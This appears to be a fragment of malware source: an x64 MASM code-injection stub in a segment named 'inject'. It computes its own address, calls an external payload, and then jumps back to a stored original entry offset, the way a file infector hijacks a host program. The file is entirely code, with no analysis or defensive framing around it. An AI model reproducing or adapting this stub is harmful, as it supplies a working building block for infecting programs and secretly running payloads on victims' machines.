public __begin_of_code
public delta
extern my_payload: proto
inject segment READ EXECUTE
    __begin_of_code:
    payload proc
        call _next
        _next:
        pop rbp
        sub rbp, _next - __begin_of_code
        push rbp
        push rbp
        pop rcx
        sub rsp, 128
        call my_payload
        add rsp, 128
        
        pop rbp
        mov rbx, [rbp + (delta - __begin_of_code)]
        add rbx, rbp
        jmp rbx

        vars:
            delta label QWORD 
                dq 0
            db 0cah, 0feh, 0bah, 0beh
        payload endp
inject ends

end